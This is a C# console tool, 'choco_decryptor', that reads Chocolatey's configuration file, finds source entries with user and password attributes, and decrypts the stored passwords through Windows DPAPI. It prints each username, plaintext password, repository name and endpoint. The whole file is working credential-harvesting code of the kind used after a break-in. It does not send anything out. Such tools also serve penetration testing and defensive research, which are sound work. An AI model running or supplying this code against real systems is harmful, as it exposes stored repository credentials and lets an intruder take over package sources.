using System;
using System.Text;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.IO;
using System.Xml.Linq;
using System.Runtime.InteropServices;
using System.Linq;

namespace choco_decryptor
{
    internal class Program
    {
        private static readonly byte[] _entropyBytes = Encoding.UTF8.GetBytes("Chocolatey");
        private static readonly string configPath = @"C:\ProgramData\chocolatey\config\chocolatey.config";

        internal static string EncryptString(string value)
        {
            if (string.IsNullOrWhiteSpace(value)) return null;

            var decryptedByteArray = Encoding.UTF8.GetBytes(value);
            var encryptedByteArray = ProtectedData.Protect(decryptedByteArray, _entropyBytes, DataProtectionScope.LocalMachine);
            var encryptedString = Convert.ToBase64String(encryptedByteArray);
            return encryptedString;
        }

        internal static string DecryptString(string encryptedString)
        {
            var encryptedByteArray = Convert.FromBase64String(encryptedString);
            var decryptedByteArray = ProtectedData.Unprotect(encryptedByteArray, _entropyBytes, DataProtectionScope.LocalMachine);
            return Encoding.UTF8.GetString(decryptedByteArray);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Initialize...");
            if (File.Exists(configPath))
            {
                Console.WriteLine("[*] Loading chocolately.config file...");
            }
            else
            {
                Console.WriteLine("[-] Config file not exist.");
                return;
            }
            var configRaw = File.ReadAllLines(configPath);
            Console.WriteLine("[+] File chocolately.config succesfully loaded!");
            List<string> credential_lines = new List<string>();
            Console.WriteLine("[*] Seeking credentials...");
            for ( int i = 0; i < configRaw.Length; i++)
            {
                if (configRaw[i].Contains("user") && configRaw[i].Contains("password"))
                {
                    credential_lines.Add(configRaw[i]);
                }
            }
            if (credential_lines.Count == 0) 
            {
                Console.WriteLine("[-] Credential not found!");
                return;
            }
            Console.WriteLine("[+] Credential found!");
            foreach( string credential in credential_lines ) 
            {
                Console.WriteLine("===========");
                XElement sourceElement = XElement.Parse(credential);
                string username = sourceElement.Attribute("user")?.Value;
                string b64Password = sourceElement.Attribute("password")?.Value;
                string repositoryName = sourceElement.Attribute("id")?.Value;
                string destinationEndpoint = sourceElement.Attribute("value")?.Value;
                if (username == null || b64Password == null)
                {
                    Console.WriteLine("[-] Error parsing gathered values. Exit...");
                    return;
                }
                Console.WriteLine($"\tUser: {username}");
                try
                { 
                    Console.WriteLine($"\tPassword: {DecryptString(b64Password)}");
                }
                catch (Exception ex)
                {
                    int errWrongDPAPIKeys = -2146893813;
                    if(ex.HResult == errWrongDPAPIKeys)
                    {
                        Console.WriteLine("\tPassword: Can't be decrypted. WRONG DPAPI MACHINE KEYS! You must run this tool inside computer where config file was made.");
                    }
                    continue;
                }
                Console.WriteLine($"\tRepository name: {repositoryName}");
                Console.WriteLine($"\tAuth destination: {destinationEndpoint}");
            }
            //string b64blob = args[1];
            //var dec = DecryptString(b64blob);
            //Console.WriteLine("Decrypted password: " + dec);
        }
    }
}
